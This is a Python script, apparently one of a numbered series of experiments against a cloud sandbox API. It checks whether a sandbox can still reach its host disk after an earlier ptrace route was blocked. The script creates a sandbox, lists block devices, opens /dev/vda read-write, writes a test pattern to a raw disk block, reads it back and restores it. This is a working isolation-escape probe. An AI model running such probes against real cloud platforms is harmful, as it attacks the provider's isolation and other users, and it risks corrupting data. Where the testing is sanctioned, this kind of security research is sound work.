# 实验J169: /dev/vda 宿主磁盘写验证 (J36/J37 实锤基础在新规则下是否存活)
# ptrace线被封(j167/j168), 检查宿主磁盘暴露线是否还可用: 列出块设备 + 读写验证
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=3000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj169"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# cmdA: 块设备盘点 + vda 基本信息
CA = r'''
import os, subprocess, json
out = open("/tmp/d169a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
p("=== /dev 块设备 ===")
p(sh("ls -la /dev/vd* /dev/sd* /dev/xvd* 2>&1"))
p("=== lsblk ===")
p(sh("lsblk 2>&1"))
p("=== vda size ===")
try:
    sz = os.path.getsize("/dev/vda")
    p("vda_size", sz)
except Exception as e:
    p("vda_size_err", repr(e))
p("=== 当前uid ===")
p("uid", os.getuid(), "euid", os.geteuid())
p("=== DONE")
out.close()
'''

# cmdB: vda 读+写验证 (512B, 写后读回, 还原) - J36/J37 同款
CB = r'''
import os, time, struct
out = open("/tmp/d169b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
try:
    fd = os.open("/dev/vda", os.O_RDWR)
    p("open_ok", fd)
except Exception as e:
    p("open_err", repr(e))
    out.close()
    raise SystemExit

# 读超级块 (XFS magic @ offset 0)
try:
    os.lseek(fd, 0, 0)
    sb = os.read(fd, 512)
    p("sb_magic", sb[0:4].hex(), "sb_len", len(sb))
except Exception as e:
    p("read_err", repr(e))

# 写测试: 选一个非关键区域 (用块 100 附近, 或文件系统日志区, 先读原值)
try:
    os.lseek(fd, 512 * 100, 0)
    orig = os.read(fd, 512)
    p("orig_first16", orig[:16].hex())
except Exception as e:
    p("orig_err", repr(e))

test = b"J169WRITETEST\x00" * 32  # 512B
test = test[:512].ljust(512, b"\x00")
try:
    os.lseek(fd, 512 * 100, 0)
    n = os.write(fd, test)
    p("write_n", n)
    os.fsync(fd)
    time.sleep(0.5)
    os.lseek(fd, 512 * 100, 0)
    back = os.read(fd, 512)
    p("readback_match", back == test)
    p("readback_first16", back[:16].hex())
    # 还原
    os.lseek(fd, 512 * 100, 0)
    os.write(fd, orig)
    os.fsync(fd)
    time.sleep(0.5)
    os.lseek(fd, 512 * 100, 0)
    restored = os.read(fd, 512)
    p("restored", restored == orig)
except Exception as e:
    p("wr_err", repr(e))
os.close(fd)
p("=== DONE")
out.close()
'''

steps = [
    ("dev-maps", "/tmp/d169a.txt", CA),
    ("vda-rw-test", "/tmp/d169b.txt", CB),
]

for label, marker, code in steps:
    st = run_cmd(sid, code, label, timeout=150)
    time.sleep(2)
    cf = catfile(sid, marker, f"marker[{label}]", 3000)
    if st == "DEAD" or cf == 410:
        print(f"\n!!! DEATH after cmd[{label}] -> trigger = {label}", flush=True)
        break

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
